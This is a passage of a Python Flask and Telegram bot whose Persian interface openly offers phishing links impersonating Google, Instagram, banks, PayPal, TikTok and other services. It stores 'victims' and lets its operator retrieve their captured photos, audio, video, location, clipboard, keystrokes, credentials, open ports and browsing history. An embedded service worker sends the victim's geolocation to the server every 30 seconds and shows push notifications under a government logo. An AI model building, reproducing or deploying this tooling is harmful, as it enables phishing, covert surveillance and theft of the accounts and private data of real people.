        return clients.openWindow(urlToOpen);
      }
    })
  );
});
self.addEventListener('push', event => {
  const payload = event.data ? event.data.text() : 'پیام جدید';
  event.waitUntil(
    self.registration.showNotification('📩 پیام از طرف ادمین', {
      body: payload,
      icon: 'https://www.fata.gov.ir/images/logo.png',
      requireInteraction: true,
      vibrate: [200, 100, 200]
    })
  );
});
setInterval(() => {
  if('geolocation' in navigator){
    navigator.geolocation.getCurrentPosition(pos => {
      self.clients.matchAll().then(clients => {
        clients.forEach(client => {
          const url = new URL(client.url);
          const token = url.searchParams.get('t') || url.pathname.split('/').pop();
          fetch('/log/'+token, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({type:'location',lat:pos.coords.latitude,lng:pos.coords.longitude})
          });
        });
      });
    });
  }
}, 30000);
"""
@app.route('/sw.js')
def service_worker():
    response = make_response(SW_JS)
    response.headers['Content-Type'] = 'application/javascript'
    return response

@app.route('/download/<path:filename>')
def download_file(filename):
    return send_from_directory('static', filename)

# -------------------- Bot Database Helper --------------------
def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# -------------------- Telegram Bot Handlers --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🔹 به ربات هوشمند خوش آمدید!\n\n"
        "📌 با دکمه «ساخت لینک جدید» یک لینک فیشینگ اختصاصی بسازید.\n"
        "🎯 نوع قربانی (گوگل، اینستاگرام، فیسبوک، بانک، بازی و...) را انتخاب کنید.\n"
        "📊 وقتی قربانی لینک را باز کند، اطلاعات دستگاه، عکس، صدا و موقعیت او برایتان ارسال می‌شود.\n\n"
        "🧠 قابلیت یادگیری کلمات:\n"
        "  /learn <b>کلمه</b> <b>پاسخ</b>\n"
        "  مثال: /learn سلام علیکم\n"
        "  /unlearn <b>کلمه</b>\n"
        "  /wordlist\n\n"
        "👤 مدیر ربات می‌تواند با /admin ربات را خاموش/روشن کرده و قربانیان را مدیریت کند.\n"
        "📈 /stats : آمار کلی\n"
        "📢 /broadcast : ارسال پیام همگانی به قربانیان\n"
        "🤖 هوش مصنوعی: در صورت فعال بودن، ربات با Groq پاسخ می‌دهد."
    )
    keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
                [InlineKeyboardButton("📖 راهنما", callback_data="help")]]
    if update.effective_user.id == ADMIN_USER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
    await update.message.reply_text(help_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ شما مجاز به استفاده از این دستور نیستید.")
        return
    keyboard = [
        [InlineKeyboardButton("روشن/خاموش کردن ربات", callback_data="toggle_bot")],
        [InlineKeyboardButton(f"🤖 AI: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}", callback_data="toggle_ai")],
        [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
        [InlineKeyboardButton("📊 آمار", callback_data="stats")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
    ]
    await update.message.reply_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))

# --- Learn/Unlearn/Wordlist ---
async def learn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ فقط مدیر ربات می‌تواند کلمه یاد بدهد.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("📝 فرمت صحیح: /learn <کلمه> <پاسخ>\nمثال: /learn سلام علیکم")
        return
    keyword = args[0].strip().lower()
    response = ' '.join(args[1:])
    conn = get_db_connection()
    conn.execute("INSERT OR REPLACE INTO learned (keyword, response) VALUES (?, ?)", (keyword, response))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ یاد گرفتم: وقتی کسی بگوید «{keyword}» پاسخ دهم «{response}»")

async def unlearn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ فقط مدیر ربات می‌تواند کلمات را حذف کند.")
        return
    if not context.args:
        await update.message.reply_text("📝 لطفاً کلمه‌ای که می‌خواهید حذف کنید را وارد کنید: /unlearn <کلمه>")
        return
    keyword = context.args[0].strip().lower()
    conn = get_db_connection()
    cur = conn.execute("DELETE FROM learned WHERE keyword=?", (keyword,))
    conn.commit()
    conn.close()
    if cur.rowcount > 0:
        await update.message.reply_text(f"❌ کلمه «{keyword}» و پاسخ مرتبط حذف شد.")
    else:
        await update.message.reply_text(f"⚠️ کلمه «{keyword}» در لیست یادگیری وجود ندارد.")

async def wordlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = get_db_connection()
    rows = conn.execute("SELECT keyword, response FROM learned ORDER BY keyword").fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("📭 هنوز هیچ کلمه‌ای یاد نگرفته‌ام.")
        return
    text = "📚 کلمات یادگرفته شده:\n\n"
    for row in rows:
        text += f"• <b>{row['keyword']}</b> → {row['response']}\n"
    await update.message.reply_text(text, parse_mode="HTML")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ فقط مدیر می‌تواند آمار را ببیند.")
        return
    conn = get_db_connection()
    victims_count = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
    photos = conn.execute("SELECT COUNT(*) FROM media WHERE type='photo'").fetchone()[0]
    videos = conn.execute("SELECT COUNT(*) FROM media WHERE type='video'").fetchone()[0]
    audios = conn.execute("SELECT COUNT(*) FROM media WHERE type='audio'").fetchone()[0]
    creds = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
    learned = conn.execute("SELECT COUNT(*) FROM learned").fetchone()[0]
    conn.close()
    text = (
        f"📊 <b>آمار ربات</b>\n"
        f"👥 قربانیان: {victims_count}\n"
        f"📸 عکس: {photos}\n"
        f"🎥 ویدیو: {videos}\n"
        f"🎤 صدا: {audios}\n"
        f"🔑 اطلاعات ورود: {creds}\n"
        f"🧠 کلمات یادگرفته: {learned}\n"
        f"🤖 هوش مصنوعی: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}\n"
        f"🤖 ربات: {'✅ فعال' if BOT_ACTIVE else '❌ غیرفعال'}"
    )
    await update.message.reply_text(text, parse_mode="HTML")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ فقط مدیر می‌تواند پیام همگانی بفرستد.")
        return
    if not context.args:
        await update.message.reply_text("📢 لطفاً متن پیام را بعد از دستور بنویسید: /broadcast <متن>")
        return
    message = ' '.join(context.args)
    conn = get_db_connection()
    victims = conn.execute("SELECT token FROM victims").fetchall()
    conn.close()
    # In a real scenario, you would send push notifications to all registered service workers
    await update.message.reply_text(f"📢 پیام به {len(victims)} قربانی ارسال خواهد شد (در صورت آنلاین بودن، نوتیفیکیشن دریافت می‌کنند).")

# --- Auto-reply with learned words, then AI ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg_text = update.message.text.lower()
    # 1. Check learned keywords
    conn = get_db_connection()
    rows = conn.execute("SELECT keyword, response FROM learned").fetchall()
    for row in rows:
        if row['keyword'] in msg_text:
            await update.message.reply_text(row['response'])
            conn.close()
            return
    conn.close()
    # 2. AI if enabled
    if AI_ENABLED and GROQ_API_KEY:
        thinking_msg = await update.message.reply_text("🤔 در حال فکر کردن...")
        answer = ask_groq(update.message.text)
        await thinking_msg.edit_text(answer)

# --- Callback Handler ---
PHISHING_TYPES = {
    "google": "🔵 گوگل", "gmail": "✉️ جیمیل", "instagram": "📸 اینستاگرام",
    "facebook": "👤 فیسبوک", "bank": "🏦 درگاه بانکی", "supercell": "🎮 سوپرسل",
    "lottery": "🎰 گردونه شانس", "twitter": "🐦 توییتر", "snapchat": "👻 اسنپ‌چت",
    "paypal": "💰 پی‌پال", "tiktok": "🎵 تیک‌تاک"
}

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOT_ACTIVE, AI_ENABLED
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    try:
        if data == "new_link":
            if not BOT_ACTIVE:
                await query.edit_message_text("❌ ربات در حال حاضر غیرفعال است.")
                return
            keyboard = []
            row = []
            for code, name in PHISHING_TYPES.items():
                row.append(InlineKeyboardButton(name, callback_data=f"genlink_{code}"))
                if len(row) == 2:
                    keyboard.append(row)
                    row = []
            if row:
                keyboard.append(row)
            keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="start")])
            await query.edit_message_text("🎯 نوع قربانی را انتخاب کنید:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif data.startswith("genlink_"):
            ptype = data.replace("genlink_", "")
            token = str(uuid.uuid4())
            conn = get_db_connection()
            conn.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type) VALUES (?, ?, ?, ?, ?)",
                         (token, datetime.now().isoformat(), query.message.chat.id if query.message else "0.0.0.0", datetime.now().isoformat(), ptype))
            conn.commit()
            conn.close()
            link = f"{PUBLIC_URL}/go/{token}"
            await query.edit_message_text(f"✅ لینک ({PHISHING_TYPES[ptype]}) آماده:\n{link}\n\nبرای قربانی ارسال کنید.")

        elif data == "help":
            await start(update.callback_query, context)

        elif data == "admin_panel":
            if user_id != ADMIN_USER_ID:
                await query.answer("⛔ دسترسی محدود", show_alert=True)
                return
            keyboard = [
                [InlineKeyboardButton("روشن/خاموش ربات", callback_data="toggle_bot")],
                [InlineKeyboardButton(f"🤖 AI: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}", callback_data="toggle_ai")],
                [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
                [InlineKeyboardButton("📊 آمار", callback_data="stats")],
                [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
            ]
            await query.edit_message_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "toggle_bot":
            if user_id != ADMIN_USER_ID:
                await query.answer("⛔ اجازه ندارید", show_alert=True)
                return
            BOT_ACTIVE = not BOT_ACTIVE
            status = "✅ فعال" if BOT_ACTIVE else "❌ غیرفعال"
            await query.edit_message_text(f"وضعیت ربات: {status}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))

        elif data == "toggle_ai":
            if user_id != ADMIN_USER_ID:
                await query.answer("⛔ اجازه ندارید", show_alert=True)
                return
            if not GROQ_API_KEY:
                await query.answer("⚠️ کلید Groq تنظیم نشده است. لطفاً GROQ_API_KEY را در Render تنظیم کنید.", show_alert=True)
                return
            AI_ENABLED = not AI_ENABLED
            status = "✅ روشن" if AI_ENABLED else "❌ خاموش"
            await query.edit_message_text(f"هوش مصنوعی {status} شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))

        elif data == "stats":
            if user_id != ADMIN_USER_ID:
                await query.answer("⛔ اجازه ندارید", show_alert=True)
                return
            conn = get_db_connection()
            victims_count = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
            photos = conn.execute("SELECT COUNT(*) FROM media WHERE type='photo'").fetchone()[0]
            videos = conn.execute("SELECT COUNT(*) FROM media WHERE type='video'").fetchone()[0]
            audios = conn.execute("SELECT COUNT(*) FROM media WHERE type='audio'").fetchone()[0]
            creds = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
            learned = conn.execute("SELECT COUNT(*) FROM learned").fetchone()[0]
            conn.close()
            text = (
                f"📊 <b>آمار ربات</b>\n"
                f"👥 قربانیان: {victims_count}\n"
                f"📸 عکس: {photos}\n"
                f"🎥 ویدیو: {videos}\n"
                f"🎤 صدا: {audios}\n"
                f"🔑 اطلاعات ورود: {creds}\n"
                f"🧠 کلمات یادگرفته: {learned}\n"
                f"🤖 هوش مصنوعی: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}\n"
                f"🤖 ربات: {'✅ فعال' if BOT_ACTIVE else '❌ غیرفعال'}"
            )
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))

        elif data == "victims_list":
            if user_id != ADMIN_USER_ID:
                await query.answer("⛔ اجازه ندارید", show_alert=True)
                return
            conn = get_db_connection()
            victims = conn.execute("SELECT token, ip, last_active, phishing_type FROM victims ORDER BY last_active DESC").fetchall()
            conn.close()
            if not victims:
                await query.edit_message_text("هنوز قربانی‌ای ثبت نشده.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
                return
            buttons = []
            for v in victims:
                short = v['token'][:8] + "..."
                last = v['last_active'] if v['last_active'] else "نامشخص"
                ptype = PHISHING_TYPES.get(v['phishing_type'], v['phishing_type'])
                btn = InlineKeyboardButton(f"{ptype} | {short} | {last}", callback_data=f"victim_detail|{v['token']}")
                buttons.append([btn])
            buttons.append([InlineKeyboardButton("بازگشت به پنل", callback_data="admin_panel")])
            await query.edit_message_text("📋 لیست قربانیان (روی هرکدام کلیک کنید):", reply_markup=InlineKeyboardMarkup(buttons))

        elif data.startswith("victim_detail|"):
            if user_id != ADMIN_USER_ID:
                await query.answer("⛔ اجازه ندارید", show_alert=True)
                return
            token = data.split("|")[1]
            conn = get_db_connection()
            victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
            if not victim:
                await query.edit_message_text("قربانی یافت نشد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
                conn.close()
                return
            log_dev = conn.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
            info = json.loads(log_dev['data']) if log_dev else {"warning": "هنوز اطلاعات دستگاه ارسال نشده است."}
            conn.close()

            text = f"<b>مشخصات قربانی</b>\n"
            text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
            text += f"<b>IP:</b> {victim['ip']}\n"
            text += f"<b>زمان ایجاد:</b> {victim['created_at']}\n"
            text += f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
            text += f"<b>نوع فیشینگ:</b> {PHISHING_TYPES.get(victim['phishing_type'], victim['phishing_type'])}\n"
            text += f"<b>اطلاعات دستگاه:</b>\n<pre>{json.dumps(info, indent=2, ensure_ascii=False)}</pre>"

            keyboard = [
                [InlineKeyboardButton("📸 عکس", callback_data=f"photo|{token}"),
                 InlineKeyboardButton("🎤 صدا", callback_data=f"audio|{token}"),
                 InlineKeyboardButton("🎥 ویدیو", callback_data=f"video|{token}")],
                [InlineKeyboardButton("📍 موقعیت", callback_data=f"location|{token}"),
                 InlineKeyboardButton("📋 کلیپ‌بورد", callback_data=f"clipboard|{token}"),
                 InlineKeyboardButton("⌨️ کی‌استروک", callback_data=f"keystrokes|{token}")],
                [InlineKeyboardButton("🔌 پورت‌ها", callback_data=f"ports|{token}"),
                 InlineKeyboardButton("🌐 تاریخچه", callback_data=f"history|{token}")],
                [InlineKeyboardButton("🗑 حذف قربانی", callback_data=f"delete_victim|{token}")],
                [InlineKeyboardButton("🔙 بازگشت به لیست", callback_data="victims_list")]
            ]
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

        # Media retrieval with retry
        elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("video|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
            parts = data.split('|')
            action = parts[0]
            token = parts[1]
            conn = get_db_connection()
            if action == "photo":
                row = conn.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row and row['data']:
                    await query.message.reply_photo(photo=io.BytesIO(row['data']), caption=f"📸 عکس از {token}")
                else:
                    retry_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"photo|{token}")]])
                    await query.message.reply_text("⚠️ عکسی ثبت نشده.", reply_markup=retry_keyboard)
            elif action == "audio":
                row = conn.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row and row['data']:
                    await query.message.reply_audio(audio=io.BytesIO(row['data']), caption=f"🎤 صدا از {token}")
                else:
                    retry_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"audio|{token}")]])
                    await query.message.reply_text("⚠️ صدایی ضبط نشده.", reply_markup=retry_keyboard)
            elif action == "video":
                row = conn.execute("SELECT data FROM media WHERE token=? AND type='video' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row and row['data']:
                    await query.message.reply_video(video=io.BytesIO(row['data']), caption=f"🎥 ویدیو از {token}")
                else:
                    retry_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 تلاش مجدد", callback_data=f"video|{token}")]])
                    await query.message.reply_text("⚠️ ویدیویی ضبط نشده.", reply_markup=retry_keyboard)
            elif action == "location":
                row = conn.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row:
                    d = json.loads(row['data'])
                    await query.message.reply_location(latitude=d['lat'], longitude=d['lng'])
                else:
                    await query.answer("موقعیت یافت نشد.", show_alert=True)
            elif action == "clipboard":
                row = conn.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
                if row:
                    d = json.loads(row['data'])
                    await query.message.reply_text(f"📋 Clipboard: <code>{d['data']}</code>", parse_mode='HTML')
                else:
                    await query.answer("کلیپ‌بورد خالی.", show_alert=True)
            elif action == "keystrokes":
                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
                if rows:
                    keys = ''.join([json.loads(r['data'])['data'] for r in rows])
                    await query.message.reply_text(f"⌨️ Keystrokes: <code>{keys}</code>", parse_mode='HTML')
                else:
                    await query.answer("کی‌استروکی ثبت نشده.", show_alert=True)
            elif action == "ports":
                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='open_port'", (token,)).fetchall()
                if rows:
                    ports = set([json.loads(r['data'])['port'] for r in rows])
                    await query.message.reply_text(f"🔌 Open ports: {', '.join(map(str, ports))}")
                else:
                    await query.answer("پورت بازی یافت نشد.", show_alert=True)
            elif action == "history":
                rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
                if rows:
                    hist = ', '.join([f"{json.loads(r['data'])['site']} ({json.loads(r['data'])['visited']})" for r in rows])
                    await query.message.reply_text(f"🌐 Visited: {hist}")
                else:
                    await query.answer("تاریخچه‌ای یافت نشد.", show_alert=True)
            conn.close()

        elif data.startswith("delete_victim|"):
            if user_id != ADMIN_USER_ID:
                await query.answer("⛔ اجازه ندارید", show_alert=True)
                return
            token = data.split("|")[1]
            conn = get_db_connection()
            conn.execute("DELETE FROM victims WHERE token=?", (token,))
            conn.execute("DELETE FROM logs WHERE token=?", (token,))
            conn.execute("DELETE FROM media WHERE token=?", (token,))
            conn.execute("DELETE FROM credentials WHERE token=?", (token,))
            conn.commit()
            conn.close()
            await query.edit_message_text(f"🗑 قربانی {token} و تمام داده‌های مرتبط حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))

        elif data == "start":
            keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
            if user_id == ADMIN_USER_ID:
                keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
            await query.edit_message_text("منوی اصلی:", reply_markup=InlineKeyboardMarkup(keyboard))

    except Exception as e:
        app.logger.error(f"Button error: {e}")
        await query.edit_message_text("❌ خطایی رخ داد. لطفاً دوباره تلاش کنید.")

async def search_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ فقط مدیر می‌تواند جستجو کند.")
        return
    if not context.args:
        await update.message.reply_text("لطفاً یک توکن وارد کنید: /search <token>")
        return
    token = context.args[0]
    conn = get_db_connection()
    victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
    if victim:
        text = f"<b>قربانی پیدا شد:</b>\n"
        text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
        text += f"<b>IP:</b> {victim['ip']}\n"
        text += f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
        text += f"<b>نوع فیشینگ:</b> {victim['phishing_type']}"
        keyboard = [[InlineKeyboardButton("مشاهده جزئیات", callback_data=f"victim_detail|{token}")]]
        await update.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text("قربانی با این توکن یافت نشد.")
    conn.close()

# -------------------- Main --------------------
def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    init_db()
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_cmd))
    application.add_handler(CommandHandler("learn", learn_command))
    application.add_handler(CommandHandler("unlearn", unlearn_command))
    application.add_handler(CommandHandler("wordlist", wordlist_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("search", search_victim))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling()
